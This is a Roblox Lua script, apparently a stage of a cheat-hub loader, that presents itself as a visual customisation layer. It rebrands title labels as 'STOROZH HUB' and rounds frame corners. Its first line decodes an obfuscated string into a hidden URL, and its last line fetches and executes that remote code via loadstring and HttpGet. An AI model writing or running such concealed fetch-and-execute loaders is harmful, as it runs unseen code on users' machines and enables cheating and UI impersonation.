
--[[ STAGE 2: VISUAL CORE ]]
local uiT2ldk6WMQDzu1PKGtvo="\165\143\148\200\195\144\138\184\149\188\137\128\143\135\135\116\105\117\143\121\125\108\117\100\149\117\094\099\092\091\082\117\103\115\109\113\095\070\066\075\064\067\095\121\062\059\065\051\119\054\052\063\039\041\055\047\026\040\091\034\019\028\033\019\025\023\025\008\015\012\067\003\007\009\058\242\254\007\244\240\247\249\238\243\227\231\246\219\236\222\225\225\030\213\225\212\023\021\006\205\204\198\196\206"local XzitjYyuW_a3=122 local bLPNRz3eq9rLWrtGQnJ8g=115 local xFSXrMmpVQnN1NQ6lQzW=1 local qxizarg58ULoavno05sBa=2 local _vJcmTiN6d_Xe=9 local ZV8owBmRdSxSBeyFh3o=true local xLnEepzb1fKPg3E2uk=bit32 and bit32.bxor if not xLnEepzb1fKPg3E2uk then xLnEepzb1fKPg3E2uk=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local NaELPlUJM_cVajvq6A={}for jm16FRZQSiY0gG=1,#uiT2ldk6WMQDzu1PKGtvo do local ocXM2Nu59RaRJb5Rx=string.byte(uiT2ldk6WMQDzu1PKGtvo,jm16FRZQSiY0gG)local qFNJNcG6C2LftQ_w3ZIpP=(bLPNRz3eq9rLWrtGQnJ8g+(jm16FRZQSiY0gG*qxizarg58ULoavno05sBa)+_vJcmTiN6d_Xe)%256 if xFSXrMmpVQnN1NQ6lQzW==0 then ocXM2Nu59RaRJb5Rx=(ocXM2Nu59RaRJb5Rx-qFNJNcG6C2LftQ_w3ZIpP)%256 NaELPlUJM_cVajvq6A[jm16FRZQSiY0gG]=string.char(xLnEepzb1fKPg3E2uk(ocXM2Nu59RaRJb5Rx,XzitjYyuW_a3))else ocXM2Nu59RaRJb5Rx=xLnEepzb1fKPg3E2uk(ocXM2Nu59RaRJb5Rx,XzitjYyuW_a3)NaELPlUJM_cVajvq6A[jm16FRZQSiY0gG]=string.char((ocXM2Nu59RaRJb5Rx-qFNJNcG6C2LftQ_w3ZIpP)%256)end end local TqLbSBB8QkyEK=table.concat(NaELPlUJM_cVajvq6A)if ZV8owBmRdSxSBeyFh3o then TqLbSBB8QkyEK=string.reverse(TqLbSBB8QkyEK)end local wt7PITCJsjxF=TqLbSBB8QkyEK
local HubName = "STOROZH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(wt7PITCJsjxF))()
